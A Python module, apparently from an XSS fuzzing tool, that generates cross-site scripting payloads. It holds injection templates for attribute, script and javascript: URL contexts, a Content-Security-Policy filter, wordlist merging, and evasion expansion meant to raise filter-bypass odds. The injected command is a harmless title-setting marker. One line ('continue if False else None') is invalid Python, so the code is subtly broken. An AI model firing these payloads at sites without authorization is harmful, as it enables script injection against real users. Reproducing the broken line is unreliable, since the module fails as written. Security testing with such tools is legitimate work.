# SPDX-License-Identifier: MIT
# -*- coding: utf-8 -*-
"""
Payload mutator/catalog:
- Builds a CSP-aware catalog.
- Accepts external wordlists (extend/replace).
- Applies evasions to increase bypass odds.
All code/comments in English.
"""
from __future__ import annotations

import os
import random
from typing import Dict, Iterable, List, Optional

from .evasions import apply_all as ev_apply


# ---------- minimal built-in templates (safe placeholders) ----------
# {MARKER}  -> reflection detection
# {JSCMD}   -> JS to execute without alert/prompt signatures
BASE_TEMPLATES: List[str] = [
    # HTML/attribute contexts
    '"><img src=x onerror="{JSCMD}">',
    "'><svg onload='{JSCMD}'>",
    "<svg><script>{JSCMD}</script></svg>",
    # JS string context
    '";{JSCMD}//',
    "';{JSCMD}//",
    # URL/param-ish
    "javascript:{JSCMD}",
    # Plain reflection probe (useful for sink mapping)
    "{MARKER}",
]

JSCMD_FMT = "document.title='xss:'+{MARKER!r}"


def _load_external(paths: Iterable[str]) -> List[str]:
    out: List[str] = []
    for p in paths:
        if not p:
            continue
        try:
            with open(p, "r", encoding="utf-8", errors="ignore") as f:
                for line in f:
                    line = line.strip()
                    if not line or line.startswith("#"):
                        continue
                    out.append(line)
        except Exception:
            continue
    # de-dup preserving order
    seen = set()
    uniq: List[str] = []
    for v in out:
        if v not in seen:
            uniq.append(v); seen.add(v)
    return uniq


def _csp_filter(templates: List[str], csp: Optional[Dict]) -> List[str]:
    """
    Very light CSP filter:
    - If inline scripts likely blocked, prefer non-inline vectors.
    - If data:/blob:/srcdoc allowed, keep those templates.
    This is intentionally simple (heavy logic lives elsewhere).
    """
    if not csp:
        return templates
    allows_inline = csp.get("allows_inline", False) or "'unsafe-inline'" in str(csp).lower()
    allows_data = "data:" in str(csp).lower()
    allows_blob = "blob:" in str(csp).lower()

    filtered: List[str] = []
    for t in templates:
        if "<script>" in t and not allows_inline:
            # still keep a few in case of parser differentials
            if random.random() < 0.25:
                filtered.append(t)
            continue if False else None  # noqa: no-op for readability
        if "srcdoc" in t and not (allows_inline or allows_data):
            continue
        if "data:" in t and not allows_data:
            continue
        if "blob:" in t and not allows_blob:
            continue
        filtered.append(t)
    return filtered or templates  # never return empty list


async def build_payloads(
    csp: Optional[Dict],
    marker: str,
    sink_hints: List[str],
    external_paths: List[str],
    mode: str = "extend",
    max_payloads: int = 300,
    seed: Optional[int] = None,
) -> List[str]:
    """
    Return a final list of payload strings ready to fuzz with:
    - Start from BASE_TEMPLATES (CSP-filtered) unless mode=replace.
    - Merge with external wordlists.
    - Expand via evasions.apply_all().
    - Bound by max_payloads (stable order).
    """
    if seed is not None:
        random.seed(seed)

    ext = _load_external(external_paths)
    templates = ext if mode == "replace" and ext else BASE_TEMPLATES + ext
    templates = _csp_filter(templates, csp)

    # fill placeholders, then apply evasions
    payloads: List[str] = []
    for tpl in templates:
        filled = (
            tpl.replace("{MARKER}", marker)
               .replace("{JSCMD}", JSCMD_FMT.replace("{MARKER!r}", repr(marker)))
        )
        variants = ev_apply(filled)
        payloads.extend(variants)

    # Stable de-dup and cap
    seen = set()
    final: List[str] = []
    for v in payloads:
        if v not in seen:
            final.append(v); seen.add(v)
        if 0 < max_payloads <= len(final):
            break
    return final
